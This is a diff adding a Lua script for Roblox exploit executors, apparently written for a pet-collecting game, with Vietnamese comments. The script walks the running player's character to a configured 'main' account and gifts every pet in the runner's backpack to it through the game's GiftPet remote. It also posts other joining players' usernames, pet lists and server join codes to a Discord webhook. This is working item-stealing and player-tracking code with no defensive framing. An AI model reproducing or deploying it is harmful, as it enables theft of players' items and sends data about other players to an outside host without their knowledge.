@@ -1,0 +1,162 @@
+-- ⚙️ CONFIG
+local MAIN_USER_ID = tonumber(getgenv().id)
+local WEBHOOK_URL = tostring(getgenv().webhook or "")
+
+local PET_NAMES = {
+    "Bunny", "Dog", "Golden Lab", "Bee", "Black Bunny", "Cat", "Chicken", "Deer",
+    "Monkey", "Orange Tabby", "Pig", "Rooster", "Spotted Deer", "Honey Bee", "Cow",
+    "Polar Bear", "Sea Otter", "Silver Monkey", "Wasp", "Tarantula Hawk", "Turle",
+    "Petal Bee", "Moth", "Brown Mouse", "Caterpillar", "Giant Ant", "Grey Mouse",
+    "Praying Mantis", "Red Fox", "Red Giant Ant", "Snail", "Squirrel", "Bear Bee",
+    "Butterfly", "Dragon Fly", "Queen Bee", "Disco Bee"
+}
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+
+-- 🔍 Tìm player chính
+local function getMainPlayer()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.UserId == MAIN_USER_ID then
+            return p
+        end
+    end
+    return nil
+end
+
+-- 📦 Lấy danh sách pet
+local function getAllValidPetTools()
+    local Backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
+    local results = {}
+
+    for _, tool in ipairs(Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            for _, petName in ipairs(PET_NAMES) do
+                if tool.Name:match("^" .. petName) then
+                    table.insert(results, {tool = tool, name = petName})
+                    break
+                end
+            end
+        end
+    end
+
+    return results
+end
+
+-- 🧍‍♂️ Di chuyển đến main
+local function moveToPlayer(target)
+    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local tgt = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+    if hrp and tgt then
+        local tween = TweenService:Create(hrp, TweenInfo.new(1), {
+            CFrame = tgt.CFrame + Vector3.new(0, 0, 2)
+        })
+        tween:Play()
+        tween.Completed:Wait()
+    end
+end
+
+-- 🎁 Gift pet
+local function giftPetTo(player, petName)
+    local giftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
+    giftRemote:FireServer(player, petName)
+end
+
+-- 🔁 Gift tất cả pet
+local function autoGiftAllPets(mainPlayer)
+    local pets = getAllValidPetTools()
+    if #pets == 0 then return end
+
+    moveToPlayer(mainPlayer)
+
+    for _, pet in ipairs(pets) do
+        local tool = pet.tool
+        local petName = pet.name
+
+        LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(tool)
+        task.wait(0.2)
+
+        giftPetTo(mainPlayer, petName)
+        task.wait(0.5)
+    end
+end
+
+-- 📩 Gửi webhook Discord
+local function getPetList(player)
+    local list = {}
+    local backpack = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            for _, petName in ipairs(PET_NAMES) do
+                if tool.Name:match("^" .. petName) then
+                    table.insert(list, tool.Name)
+                    break
+                end
+            end
+        end
+    end
+    return list
+end
+
+local function sendWebhook(player)
+    if WEBHOOK_URL == "" then return end
+
+    local petList = getPetList(player)
+    local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    local content = {
+        embeds = {{
+            title = "🎮 Người chơi mới vào server",
+            fields = {
+                { name = "👤 Username", value = player.DisplayName .. " (`" .. player.Name .. "`)", inline = false },
+                { name = "🎲 Game", value = gameName, inline = false },
+                { name = "📦 Danh sách pet", value = #petList > 0 and table.concat(petList, "\n") or "Không có pet", inline = false },
+                { name = "🔗 Join Code", value = game.JobId or "Không rõ", inline = false }
+            },
+            color = 65280
+        }}
+    }
+
+    local success, err = pcall(function()
+        local req = {
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(content)
+        }
+        if syn then syn.request(req)
+        elseif http_request then http_request(req)
+        elseif request then request(req) end
+    end)
+
+    if success then
+        print("✅ Webhook đã gửi.")
+    else
+        warn("❌ Lỗi webhook:", err)
+    end
+end
+
+-- 📥 Khi player mới vào
+Players.PlayerAdded:Connect(function(player)
+    task.wait(3)
+    sendWebhook(player)
+
+    if player.UserId == MAIN_USER_ID then
+        task.wait(5)
+        autoGiftAllPets(player)
+    end
+end)
+
+-- 🔁 Nếu acc chính đã có trong server sẵn
+task.spawn(function()
+    local alreadyIn = getMainPlayer()
+    if alreadyIn then
+        task.wait(6)
+        autoGiftAllPets(alreadyIn)
+    else
+        print("⚠️ Main account không online.")
+    end
+end)
